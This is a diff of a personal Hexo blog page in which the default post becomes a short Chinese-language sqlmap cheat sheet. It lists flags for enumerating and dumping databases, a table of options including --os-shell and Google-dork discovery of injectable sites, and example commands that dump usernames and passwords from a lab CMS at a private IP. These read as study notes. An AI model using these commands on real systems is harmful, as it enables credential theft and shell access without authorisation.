@@ -6,7 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>Hello World</title>
+    <title>sqlmap</title>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
@@ -31,19 +31,19 @@
     <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-subtitle">Hello World</h1>
+                <h1 class="header-subtitle">sqlmap</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2021-04-23
+                            <i class="iconfont icon-time"></i> 发表时间：2021-04-24
                         </span>
                         
-                            <span id="/2021/04/23/hello-world/" class="leancloud_visitors" data-flag-title="Hello World">
+                            <span id="/2021/04/24/sqlmap/" class="leancloud_visitors" data-flag-title="sqlmap">
                                 <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                             </span>
                         
                         <span>
-                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/04/23/hello-world/"></span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/04/24/sqlmap/"></span>
                         </span>  
                     </p>                 
                 </div>
@@ -57,19 +57,40 @@
         <div id="article">
     <div class="toc"></div>
     <div class="article-body">
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-u &quot;url&quot;	检测注入点</span><br><span class="line">--dbs		列出所有数据库的名字</span><br><span class="line">--current-db 列出当前数据库的名字</span><br><span class="line">-D			指定一个数据库的名字</span><br><span class="line">--tables	列出表名</span><br><span class="line">-T			指定表名</span><br><span class="line">--columns	列出所有的字段名</span><br><span class="line">-C			指定字段</span><br><span class="line">--dump		列出字段内容</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th align="left">payload</th>
+<th align="left">mean</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">-u “shownews.asp” –cookies “id=2” –level2</td>
+<td align="left">cookie 注入</td>
+</tr>
+<tr>
+<td align="left">-u “url” –forms</td>
+<td align="left">自动检测表单</td>
+</tr>
+<tr>
+<td align="left">-r post.txt</td>
+<td align="left">从文件读取http请求</td>
+</tr>
+<tr>
+<td align="left">–os-shell</td>
+<td align="left">获取shell</td>
+</tr>
+<tr>
+<td align="left">sqlmap -g “inurl:php?id=”</td>
+<td align="left">利用google自动搜索注入点</td>
+</tr>
+</tbody></table>
+<p> 例子<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.132.161&#x2F;cms&#x2F;show.php?id&#x3D;33&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.132.161&#x2F;cms&#x2F;show.php?id&#x3D;33&quot; -D &quot;cms&quot; -T &quot;cms_users&quot; --columns</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.132.161&#x2F;cms&#x2F;show.php?id&#x3D;33&quot; -D &quot;cms&quot; -T &quot;cms_users&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure></p>
+<h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>我们也可以利用SQL 注入漏洞读写文件。但是读写文件需要一定的条件。 </p>
+<ol>
+<li>secure-file-priv可以在phpmyadmin 中开到该变量。<br>该参数在高版本的my sql .<br>数据库中限制了文件的导入导出操作。改参数可以写在my.ini 配置文件中【mysqld】下。若要配置此参数，需要修改my.ini 配置文件，并重启mysql 服务。<h3 id="自动化注入"><a href="#自动化注入" class="headerlink" title="自动化注入"></a>自动化注入</h3>持续更新中。。。。</li>
+</ol>
 
         <p class="suffix-end">__END__</p>
         <div class="suffix-box">
@@ -79,7 +100,7 @@
             <div class="suffix-box-right">
                 <span class="suffix-box-title">文章作者</span>：moss
                 <br>
-                <span class="suffix-box-title">文章出处</span>：<a href="/2021/04/23/hello-world/" target="_blank">Hello World</a>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/04/24/sqlmap/" target="_blank">sqlmap</a>
                 <br>
                 <span class="suffix-box-title">作者签名</span>：简单地活着, 肆意又精彩.
                 <br>
@@ -93,14 +114,25 @@
     </div>
     <div class="article-footer">
         
+            <div class="category">
+                分类：
+                
+                    <a href="/category/web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/">-web安全 -sql注入</a>
+                
+            </div>
+        
+        
+            <div class="tag">
+                标签：
+                
+                    <a href="/tag/sql/">-sql</a>
+                
+            </div>
         
         <div class="article-prev-next">
             
-                <a href="/2021/04/23/ctfshow-web%E5%85%A5%E9%97%A8/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/04/23/ctfshow-web%E5%85%A5%E9%97%A8/" title="发布于 2021-04-23 04:38">ctfshow-web入门</a>
-                <br>
             
-            
-                <a href="/2021/04/23/sql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/23/sql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="发布于 2021-04-23 09:06">SQL注入基础</a>
+                <a href="/2021/04/24/SQL%E6%B3%A8%E5%85%A5/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/24/SQL%E6%B3%A8%E5%85%A5/" title="发布于 2021-04-24 09:07">SQL注入</a>
             
         </div>
     </div>
@@ -187,7 +219,7 @@
         BlogAvatar    : '/image/touxiang.jpg',
         BlogStartDate : '2020-01-01',
 
-        WebsiteTitleBlur         : '(◍´꒳`◍) 啊，你这是去哪了，快回来学习',
+        WebsiteTitleBlur         : '(◍´꒳`◍) 啊，快回来学习!',
         WebsiteTitleBlurTimeOut  : 500,
         WebsiteTitleFocus        : '(*´∇｀*) 欢迎回来!',
         WebsiteTitleFocusTimeOut : 1000,
@@ -427,7 +459,7 @@
                             
                                 'SimpleMemory Author:',
                             
-                                'BNDong',
+                                'moss',
                             
                         
                     ],
